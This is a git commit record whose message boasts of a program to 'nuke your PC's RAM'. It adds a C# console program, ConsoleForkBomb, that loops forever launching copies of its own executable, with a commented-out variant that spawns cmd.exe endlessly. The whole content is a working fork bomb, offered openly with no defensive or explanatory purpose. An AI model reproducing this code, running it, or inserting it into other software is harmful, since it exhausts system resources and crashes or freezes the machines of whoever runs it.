586eab6ab0f0e2377eec78df6fdb334f1011003b
Astrea Sable Fox <astrea.sable.fox@gmail.com>
2021-03-18 20:36:36 -0500

    Created program to nuke your PC's RAM

---
+++ ConsoleForkBomb/Program.cs
@@ -0,0 +1,14 @@
+﻿using System.Diagnostics;
+
+namespace ConsoleForkBomb
+{
+	class Program
+	{
+		static void Main(string[] args)
+		{
+			//while(true){Process.Start(@"C:\WINDOWS\system32\cmd.exe");}
+			while(true){Process.Start(@"C:\Users\Fox\Documents\Visual Studio 2019\Projects\ConsoleForkBomb\bin\Debug\ConsoleForkBomb.exe");}
+			
+		}
+	}
+}
